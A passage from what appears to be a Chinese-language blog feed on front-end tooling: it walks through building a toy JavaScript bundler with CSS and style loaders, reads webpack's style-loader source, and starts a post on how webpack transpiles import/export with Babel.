class="keyword">map</span>(<span class="type">item</span> =&gt; &#123;</span><br><span class="line">    const &#123;<span class="built_in"> key</span>, deps, code &#125; = <span class="type">item</span></span><br><span class="line">    <span class="keyword">return</span> `&#123;</span><br><span class="line">     <span class="built_in"> key</span>: $&#123;JSON.stringify<span class="built_in">(key</span>)&#125;, </span><br><span class="line">      deps: $&#123;JSON.stringify(deps)&#125;,</span><br><span class="line">      code: <span class="keyword">function</span>(require, <span class="keyword">module</span>, exports)&#123;</span><br><span class="line">        $&#123;code&#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;`</span><br><span class="line">  &#125;).join(<span class="string">&#x27;,&#x27;</span>) + <span class="string">&#x27;];\n&#x27;</span></span><br><span class="line">  code += <span class="string">&#x27;var modules = &#123;&#125;;\n&#x27;</span></span><br><span class="line">  code += `execute(depRelation[<span class="number">0</span>]<span class="built_in">.key</span>)\n`</span><br><span class="line">  code += `</span><br><span class="line">  <span class="keyword">function</span> execute<span class="built_in">(key</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (modules<span class="built_in">[key</span>]) &#123; <span class="keyword">return</span> modules<span class="built_in">[key</span>] &#125;</span><br><span class="line">    var <span class="type">item</span> = depRelation.find(i =&gt; i<span class="built_in">.key</span> ===<span class="built_in"> key</span>)</span><br><span class="line">    <span class="keyword">if</span> (!<span class="type">item</span>) &#123; throw new Error(\`\$&#123;<span class="type">item</span>&#125; <span class="literal">is</span><span class="built_in"> not</span> found\`) &#125;</span><br><span class="line">    var pathToKey = <span class="built_in">(path</span>) =&gt; &#123;</span><br><span class="line">      var dirname =<span class="built_in"> key</span><span class="built_in">.substring</span>(<span class="number">0</span>,<span class="built_in"> key</span>.lastIndexOf(<span class="string">&#x27;/&#x27;</span>) + <span class="number">1</span>)</span><br><span class="line">      var projectPath = (dirname +<span class="built_in"> path</span>)<span class="built_in">.replace</span>(\/\\.\\\/\/g, <span class="string">&#x27;&#x27;</span>)<span class="built_in">.replace</span>(\/\\\/\\\/\/, <span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">      <span class="keyword">return</span> projectPath</span><br><span class="line">    &#125;</span><br><span class="line">    var require = <span class="built_in">(path</span>) =&gt; &#123;</span><br><span class="line">      <span class="keyword">return</span> execute(pathToKey<span class="built_in">(path</span>))</span><br><span class="line">    &#125;</span><br><span class="line">    modules<span class="built_in">[key</span>] = &#123; __esModule:<span class="built_in"> true</span> &#125;</span><br><span class="line">    var <span class="keyword">module</span> = &#123; exports: modules<span class="built_in">[key</span>] &#125;</span><br><span class="line">    <span class="type">item</span>.code(require, <span class="keyword">module</span>, <span class="keyword">module</span>.exports)</span><br><span class="line">    <span class="keyword">return</span> modules<span class="built_in">[key</span>]</span><br><span class="line">  &#125;</span><br><span class="line">  `</span><br><span class="line">  <span class="keyword">return</span> code</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> collectCodeAndDeps(filepath:<span class="built_in"> string</span>) &#123;</span><br><span class="line">  const<span class="built_in"> key</span> = getProjectPath(filepath) // 文件的项目路径，如 index.js</span><br><span class="line">  <span class="keyword">if</span> (depRelation.find(i =&gt; i<span class="built_in">.key</span> ===<span class="built_in"> key</span>)) &#123;</span><br><span class="line">    // 注意，重复依赖不一定是循环依赖</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">  &#125;</span><br><span class="line">  // 获取文件内容，将内容放至 depRelation</span><br><span class="line">  <span class="keyword">let</span> code = readFileSync(filepath).toString()</span><br><span class="line">  <span class="keyword">if</span> (/\.css$/.test(filepath)) &#123;</span><br><span class="line">    code = `</span><br><span class="line">      const code = $&#123;JSON.stringify(code)&#125;;</span><br><span class="line">      <span class="keyword">if</span> <span class="built_in">(document</span>) &#123;</span><br><span class="line">        const style =<span class="built_in"> document</span>.createElement(<span class="string">&#x27;style&#x27;</span>);</span><br><span class="line">        style.innerText = code;</span><br><span class="line">       <span class="built_in"> document</span><span class="built_in">.head</span>.appendChild(style);</span><br><span class="line">      &#125;</span><br><span class="line">      export <span class="keyword">default</span> code;</span><br><span class="line">    `</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  const &#123; code: es5Code &#125; = babel<span class="built_in">.transform</span>(code, &#123;</span><br><span class="line">    presets: [<span class="string">&#x27;@babel/preset-env&#x27;</span>]</span><br><span class="line">  &#125;)</span><br><span class="line">  // 初始化 depRelation<span class="built_in">[key</span>]</span><br><span class="line">  const <span class="type">item</span> = &#123;<span class="built_in"> key</span>, deps: [], code: es5Code &#125;</span><br><span class="line">  depRelation.push(<span class="type">item</span>)</span><br><span class="line">  // 将代码转为 AST</span><br><span class="line">  const ast = parse(code, &#123; sourceType: <span class="string">&#x27;module&#x27;</span> &#125;)</span><br><span class="line">  // 分析文件依赖，将内容放至 depRelation</span><br><span class="line">  traverse(ast, &#123;</span><br><span class="line">    enter:<span class="built_in"> path</span> =&gt; &#123;</span><br><span class="line">      <span class="keyword">if</span> <span class="built_in">(path</span>.<span class="type">node</span>.type === <span class="string">&#x27;ImportDeclaration&#x27;</span>) &#123;</span><br><span class="line">        //<span class="built_in"> path</span>.<span class="type">node</span>.source.<span class="keyword">value</span> 往往是一个相对路径，如 ./a.js，需要先把它转为一个绝对路径</span><br><span class="line">        const depAbsolutePath = resolve(dirname(filepath),<span class="built_in"> path</span>.<span class="type">node</span>.source.<span class="keyword">value</span>)</span><br><span class="line">        // 然后转为项目路径</span><br><span class="line">        const depProjectPath = getProjectPath(depAbsolutePath)</span><br><span class="line">        // 把依赖写进 depRelation</span><br><span class="line">        <span class="type">item</span>.deps.push(depProjectPath)</span><br><span class="line">        collectCodeAndDeps(depAbsolutePath)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line">// 获取文件相对于根目录的相对路径</span><br><span class="line"><span class="keyword">function</span> getProjectPath<span class="built_in">(path</span>:<span class="built_in"> string</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> relative(projectRoot,<span class="built_in"> path</span>)<span class="built_in">.replace</span>(/\\/g, <span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>让我们搞个页面试试代码就知道了</p></blockquote><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.js</span></span><br><span class="line">import <span class="selector-tag">a</span> from <span class="string">&#x27;./a.js&#x27;</span></span><br><span class="line">import <span class="selector-tag">b</span> from <span class="string">&#x27;./b.js&#x27;</span></span><br><span class="line">import <span class="string">&#x27;./index.css&#x27;</span></span><br><span class="line">console<span class="selector-class">.log</span>(<span class="selector-tag">a</span><span class="selector-class">.getB</span>())</span><br><span class="line">console<span class="selector-class">.log</span>(<span class="selector-tag">b</span><span class="selector-class">.getA</span>())</span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// index<span class="selector-class">.css</span></span><br><span class="line"><span class="selector-tag">body</span> &#123;<span class="attribute">background-color</span>: <span class="number">#c03</span>;&#125;s</span><br></pre></td></tr></table></figure><blockquote><p>运行 node -r ts-node&#x2F;register bundler_css.ts ，然后新建一个页面引入即可</p></blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;./dist/bundle.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/Blog/2021/03/24/javascript/Loader%E5%8E%9F%E7%90%86/index/img.png"></p><blockquote><p>到此我们已经成功加载一个 CSS 文件，但是我们没有使用 loader，我们目前是写死在打包器的。</p></blockquote><h2 id="创建-CSS-loader"><a href="#创建-CSS-loader" class="headerlink" title="创建 CSS loader"></a>创建 CSS loader</h2><h4 id="其实很简单"><a href="#其实很简单" class="headerlink" title="其实很简单"></a>其实很简单</h4><p>只需要创建文件 css-loader.js，并把代码复制过去即可</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// css-loader.js</span></span><br><span class="line"><span class="keyword">const</span> cssLoader = code =&gt; `</span><br><span class="line">  <span class="keyword">const</span> code = $&#123;JSON.stringify(code)&#125;;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">document</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> style = <span class="built_in">document</span>.createElement(<span class="string">&#x27;style&#x27;</span>);</span><br><span class="line">    style.innerText = code;</span><br><span class="line">    <span class="built_in">document</span>.head.appendChild(style);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">export</span> <span class="keyword">default</span> code;</span><br><span class="line">`</span><br><span class="line"></span><br><span class="line">module.exports = cssLoader</span><br></pre></td></tr></table></figure><p>之前的代码变成引入的文件</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="regexp">/\.css$/</span>.<span class="title function_">test</span>(filepath)) &#123;</span><br><span class="line">  code = <span class="built_in">require</span>(<span class="string">&#x27;./loader/css-loader.js&#x27;</span>)(code)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>为什么要用 require，因为很多 loader 的名字都是从配置文件中读取的，主要是为了方便动态加载</p></blockquote><h5 id="loader-长什么样子"><a href="#loader-长什么样子" class="headerlink" title="loader 长什么样子"></a>loader 长什么样子</h5><ul><li>一个loader 可以是普通函数</li><li><pre><code class="js">function transform(code)&#123;  const code2 = doSomething(code)  return code        &#125;modules.exports = transform<figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">- 一个 loader 也可以是一个异步函数</span><br><span class="line">- ```<span class="language-javascript">js</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">transform</span>(<span class="params">code</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> code2 = <span class="keyword">await</span> <span class="title function_">doSomething</span>(code)</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">return</span> code        </span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">  modules.<span class="property">exports</span> = transform</span></span><br></pre></td></tr></table></figure></code></pre></li></ul><h3 id="简单的-loader-搞定，开始优化"><a href="#简单的-loader-搞定，开始优化" class="headerlink" title="简单的 loader 搞定，开始优化"></a>简单的 loader 搞定，开始优化</h3><h6 id="单一职责原则"><a href="#单一职责原则" class="headerlink" title="单一职责原则"></a>单一职责原则</h6><ul><li>webpack 里每个 loader 只做一件事</li><li>目前我们的 css-loader 做了两件事</li><li>一是把 CSS 变为 JS 字符串</li><li>二是把 JS 字符串放到 style 标签里</li></ul><blockquote><p>不浮于表面，是 P6 的觉悟<br><em>如果你知道的东西跟别人差不多，很难进大公司</em></p></blockquote><h6 id="很显然我们只要把我们的-loader-拆成两个-loader-就可以了"><a href="#很显然我们只要把我们的-loader-拆成两个-loader-就可以了" class="headerlink" title="很显然我们只要把我们的 loader 拆成两个 loader 就可以了"></a>很显然我们只要把我们的 loader 拆成两个 loader 就可以了</h6><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// css-loader</span></span><br><span class="line">const cssLoader = <span class="keyword">code</span> =&gt; `</span><br><span class="line">  const <span class="keyword">code</span> = $&#123;JSON.stringify(<span class="keyword">code</span>)&#125;;</span><br><span class="line">  <span class="keyword">export</span> default <span class="keyword">code</span>;</span><br><span class="line">`</span><br><span class="line"></span><br><span class="line"><span class="keyword">module</span>.exports = cssLoader</span><br></pre></td></tr></table></figure><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// style-loader</span></span><br><span class="line"><span class="keyword">const</span> styleLoader = code =&gt; `</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">document</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> style = <span class="built_in">document</span>.createElement(<span class="string">&#x27;style&#x27;</span>);</span><br><span class="line">    style.innerText = $&#123;JSON.stringify(code)&#125;;</span><br><span class="line">    <span class="built_in">document</span>.head.appendChild(style);</span><br><span class="line">  &#125;</span><br><span class="line">`</span><br><span class="line">module.exports = styleLoader</span><br></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// bundle_css_loader_1</span></span><br><span class="line"><span class="keyword">if</span> (/\.css$/<span class="selector-class">.test</span>(filepath)) &#123;</span><br><span class="line">  <span class="selector-tag">code</span> = <span class="built_in">require</span>(<span class="string">&#x27;./loader1/css-loader.js&#x27;</span>)(code)</span><br><span class="line">  <span class="selector-tag">code</span> = <span class="built_in">require</span>(<span class="string">&#x27;./loader1/style-loader.js&#x27;</span>)(code)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>运行发现检查代码发现这是行不通的</p></blockquote><p><img src="/Blog/2021/03/24/javascript/Loader%E5%8E%9F%E7%90%86/index/img_1.png"></p><blockquote><p>经过 style-loader 转换过的代码，并不是我们想要的结果，说明我们的思路存在一些问题</p></blockquote><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><h4 id="我的代码错在哪儿呢？"><a href="#我的代码错在哪儿呢？" class="headerlink" title="我的代码错在哪儿呢？"></a>我的代码错在哪儿呢？</h4><ul><li><strong>style-loader 不是转译</strong></li><li>sass-loader、less-loader 这些 loader 是把代码从一种语言转译为另一种语言</li><li>因此将这样的 loader 连接起来不会出问题</li><li>但 style-loader 是在<strong>插入代码</strong>，不是转译，所以需要寻找插入时机和插入位置</li><li>插入代码的时机应该是在获取到 css-loader 的结果之后</li><li>插入代码的位置应该是在就代码的下面</li></ul><h6 id="目前缺乏一种机制可以让我们随意插入代码，而-webpack-是可以的，所以目前来说我们做不到–写不出-style-loader"><a href="#目前缺乏一种机制可以让我们随意插入代码，而-webpack-是可以的，所以目前来说我们做不到–写不出-style-loader" class="headerlink" title="目前缺乏一种机制可以让我们随意插入代码，而 webpack 是可以的，所以目前来说我们做不到–写不出 style-loader"></a>目前缺乏一种机制可以让我们随意插入代码，而 webpack 是可以的，所以目前来说我们做不到–写不出 style-loader</h6><ul><li><strong>Webpack 官方 style-loader 的思路</strong></li><li>style-loader 在 pitch 钩子里通过 css-loader 来 require 文件内容</li><li>然后在文件内容后面添加 injectStyleIntoStyleTag(content, …) 代码</li><li>接下来看看 webpack 的核心代码在哪儿</li><li>并分析</li></ul><h2 id="阅读-style-loader-源码理解-webpack"><a href="#阅读-style-loader-源码理解-webpack" class="headerlink" title="阅读 style-loader 源码理解 webpack"></a>阅读 style-loader 源码理解 webpack</h2><ul><li><strong>不推荐这么做</strong></li><li>直接看源码</li><li><strong>应该这么做</strong></li><li>不看源码，大胆假设</li><li>遇到问题，小心求证</li><li>带着问题看源码唯一正确的方式(我认为)</li><li><strong>一定要自己先想一次</strong></li><li>当你的思路无法满足需求的时候，去看别人的实现</li><li>看懂了，就悟了</li></ul><p><img src="/Blog/2021/03/24/javascript/Loader%E5%8E%9F%E7%90%86/index/img_2.png"></p><blockquote><p>全部折叠以后，代码结构十分清晰，首先他声明了一个 loaderApi 函数，然后添加了一个 pitch 函数（<strong>非常重要</strong>）</p></blockquote><blockquote><p>这个 style-loader 非常奇怪，本身竟然是一个空函数，所有的逻辑都在 pitch 函数里面。</p></blockquote><p><img src="/Blog/2021/03/24/javascript/Loader%E5%8E%9F%E7%90%86/index/img_3.png"></p><blockquote><p>由于我折叠了所有代码，逻辑结构得长清楚，首先获取所有的选项，然后验证这些选项，之后声明一些变量，最终会在一个 switch case 负责主要的逻辑</p></blockquote><p><img src="/Blog/2021/03/24/javascript/Loader%E5%8E%9F%E7%90%86/index/img_4.png"></p><blockquote><p>一般来说我们会把代码插入到 style 标签里面</p></blockquote><p><img src="/Blog/2021/03/24/javascript/Loader%E5%8E%9F%E7%90%86/index/img_5.png"></p><blockquote><p>返回的东西中，会判断是否是最新的模块系统，是的话就es6的，否则就用 nodeJS 的模块，所以我们只展开最新的</p></blockquote><p><img src="/Blog/2021/03/24/javascript/Loader%E5%8E%9F%E7%90%86/index/img_6.png"></p><blockquote><p>首先引入一个 api 函数，直接看后面的英文（’runtime&#x2F;injectStylesIntoStyleTag.js’），我们可以很容易发现这个 api 函数就是一个把 style 插入 styleTag 的函数<br>其次是引入 content，很显然这就是要插入的 style 内容，<br>我们有了一个插入函数和插入内容，有了这两样东西，那就逻辑上来说就很简单了，直接一结合就是想要的结果</p></blockquote><p><img src="/Blog/2021/03/24/javascript/Loader%E5%8E%9F%E7%90%86/index/img_7.png"></p><blockquote><p>果然，把 content 和 options 传给 api 这个函数，这样之后页面就有想要的样式了，所以这个style-loader 核心代码就三块。</p></blockquote><p><img src="/Blog/2021/03/24/javascript/Loader%E5%8E%9F%E7%90%86/index/img_8.png"></p><blockquote><p>其他代码基本就是在做各种兼容</p></blockquote><blockquote><p>这个架构看起来好像和我们写的 style-loader 一样的，但是为什么我们就很难实现了，关键在于 webpack 的 style-loader 可以去加载这个request，但是我们没有这个 request 对象，<br>再来看看我们的问题</p></blockquote><p><img src="/Blog/2021/03/24/javascript/Loader%E5%8E%9F%E7%90%86/index/img_9.png"></p><blockquote><p>我们这个地方能写啥呢？我们拿不到内容，而webpack 比我们多传入了一个 request 对象，它可以拿到代码之外的东西。</p></blockquote><p>webpack 到底有多少个 loader</p><ul><li>官方的<a href="https://webpack.js.org/loaders/">推荐列表</a></li><li>社区的<a href="https://github.com/webpack-contrib/awesome-webpack">推荐列表</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> javascript </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Webpack 核心原理</title>
      <link href="/Blog/2021/03/03/javascript/Webpack%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/index/"/>
      <url>/Blog/2021/03/03/javascript/Webpack%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/index/</url>
      
        <content type="html"><![CDATA[<h1 id="webpack-要解决的两个问题"><a href="#webpack-要解决的两个问题" class="headerlink" title="webpack 要解决的两个问题"></a>webpack 要解决的两个问题</h1><p>现有代码（接上文）</p><p><img src="/Blog/2021/03/03/javascript/Webpack%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/index/img.png"></p><blockquote><p>很遗憾，这三个文件不能运行<br>因为浏览器不支持直接运行带有 import 和 export 关键字的代码</p></blockquote><h2 id="怎么样才能运行-import-x2F-export"><a href="#怎么样才能运行-import-x2F-export" class="headerlink" title="怎么样才能运行 import &#x2F; export"></a>怎么样才能运行 import &#x2F; export</h2><ul><li>不同浏览器功能不同<ul><li>现代浏览器可以通过 <script type=midule> 来支持 import export</li><li>IE 8~15不支持 import export，所以不可能运行</li></ul></li><li>兼容策略<ul><li>激进的兼容策略：把代码全放在 <script type=module> 里</li><li>缺点：不被 IE 8~15 支持；而且会导致<strong>文件请求过多</strong>（每个 import 的文件浏览器都会发出一个请求）</li><li><strong>平稳的兼容策略</strong>：把关键字转译为普通代码，并把所有文件打包成一个文件</li><li>缺点：需要复杂的代码来完成这件事情，接下来我们将完成这件事</li></ul></li></ul><h1 id="编译-import-和-export-关键字"><a href="#编译-import-和-export-关键字" class="headerlink" title="编译 import 和 export 关键字"></a>编译 import 和 export 关键字</h1><h2 id="解决第一个问题，怎么把-import-export-转换成函数"><a href="#解决第一个问题，怎么把-import-export-转换成函数" class="headerlink" title="解决第一个问题，怎么把 import / export 转换成函数"></a>解决第一个问题，怎么把 import / export 转换成函数</h2><blockquote><p>@babel/core 已经帮我们做了</p></blockquote><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// bundler_1.ts</span></span><br><span class="line"><span class="keyword">import</span> &#123; parse &#125; <span class="keyword">from</span> <span class="string">&quot;@babel/parser&quot;</span></span><br><span class="line"><span class="keyword">import</span> traverse <span class="keyword">from</span> <span class="string">&quot;@babel/traverse&quot;</span></span><br><span class="line"><span class="keyword">import</span> &#123; readFileSync &#125; <span class="keyword">from</span> <span class="string">&#x27;fs&#x27;</span></span><br><span class="line"><span class="keyword">import</span> &#123; resolve, relative, dirname &#125; <span class="keyword">from</span> <span class="string">&#x27;path&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> babel <span class="keyword">from</span> <span class="string">&#x27;@babel/core&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置根目录</span></span><br><span class="line"><span class="keyword">const</span> projectRoot = <span class="title function_">resolve</span>(__dirname, <span class="string">&#x27;project_1&#x27;</span>)</span><br><span class="line"><span class="comment">// 类型声明</span></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">DepRelation</span> = &#123; [<span class="attr">key</span>: <span class="built_in">string</span>]: &#123; <span class="attr">deps</span>: <span class="built_in">string</span>[], <span class="attr">code</span>: <span class="built_in">string</span> &#125; &#125;</span><br><span class="line"><span class="comment">// 初始化一个空的 depRelation，用于收集依赖</span></span><br><span class="line"><span class="keyword">const</span> <span class="attr">depRelation</span>: <span class="title class_">DepRelation</span> = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将入口文件的绝对路径传入函数，如 D:\demo\fixture_1\index.js</span></span><br><span class="line"><span class="title function_">collectCodeAndDeps</span>(<span class="title function_">resolve</span>(projectRoot, <span class="string">&#x27;index.js&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(depRelation)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;done&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">collectCodeAndDeps</span>(<span class="params">filepath: <span class="built_in">string</span></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> key = <span class="title function_">getProjectPath</span>(filepath) <span class="comment">// 文件的项目路径，如 index.js</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="title class_">Object</span>.<span class="title function_">keys</span>(depRelation).<span class="title function_">includes</span>(key)) &#123;</span><br><span class="line">    <span class="comment">// 注意，重复依赖不一定是循环依赖</span></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 获取文件内容，将内容放至 depRelation</span></span><br><span class="line">  <span class="keyword">const</span> code = <span class="title function_">readFileSync</span>(filepath).<span class="title function_">toString</span>()</span><br><span class="line">  <span class="keyword">const</span> &#123; <span class="attr">code</span>: es5Code &#125; = babel.<span class="title function_">transform</span>(code, &#123;</span><br><span class="line">    <span class="attr">presets</span>: [<span class="string">&#x27;@babel/preset-env&#x27;</span>]</span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="comment">// 初始化 depRelation[key]</span></span><br><span class="line">  depRelation[key] = &#123; <span class="attr">deps</span>: [], <span class="attr">code</span>: es5Code &#125;</span><br><span class="line">  <span class="comment">// 将代码转为 AST</span></span><br><span class="line">  <span class="keyword">const</span> ast = <span class="title function_">parse</span>(code, &#123; <span class="attr">sourceType</span>: <span class="string">&#x27;module&#x27;</span> &#125;)</span><br><span class="line">  <span class="comment">// 分析文件依赖，将内容放至 depRelation</span></span><br><span class="line">  <span class="title function_">traverse</span>(ast, &#123;</span><br><span class="line">    <span class="attr">enter</span>: <span class="function"><span class="params">path</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (path.<span class="property">node</span>.<span class="property">type</span> === <span class="string">&#x27;ImportDeclaration&#x27;</span>) &#123;</span><br><span class="line">        <span class="comment">// path.node.source.value 往往是一个相对路径，如 ./a.js，需要先把它转为一个绝对路径</span></span><br><span class="line">        <span class="keyword">const</span> depAbsolutePath = <span class="title function_">resolve</span>(<span class="title function_">dirname</span>(filepath), path.<span class="property">node</span>.<span class="property">source</span>.<span class="property">value</span>)</span><br><span class="line">        <span class="comment">// 然后转为项目路径</span></span><br><span class="line">        <span class="keyword">const</span> depProjectPath = <span class="title function_">getProjectPath</span>(depAbsolutePath)</span><br><span class="line">        <span class="comment">// 把依赖写进 depRelation</span></span><br><span class="line">        depRelation[key].<span class="property">deps</span>.<span class="title function_">push</span>(depProjectPath)</span><br><span class="line">        <span class="title function_">collectCodeAndDeps</span>(depAbsolutePath)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 获取文件相对于根目录的相对路径</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getProjectPath</span>(<span class="params">path: <span class="built_in">string</span></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">relative</span>(projectRoot, path).<span class="title function_">replace</span>(<span class="regexp">/\\/g</span>, <span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>运行 node -r ts-node/register bundler_1.ts</p></blockquote><p><img src="/Blog/2021/03/03/javascript/Webpack%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/index/img_1.png"></p><blockquote><p>a.js 的变化<br>1、import 关键字不见了<br>2、变成了 require<br>3、export 关键字不见了<br>4、变成了 exports['default']</p></blockquote><h3 id="具体分析转译后的-a-js-代码"><a href="#具体分析转译后的-a-js-代码" class="headerlink" title="具体分析转译后的 a.js 代码"></a>具体分析转译后的 a.js 代码</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 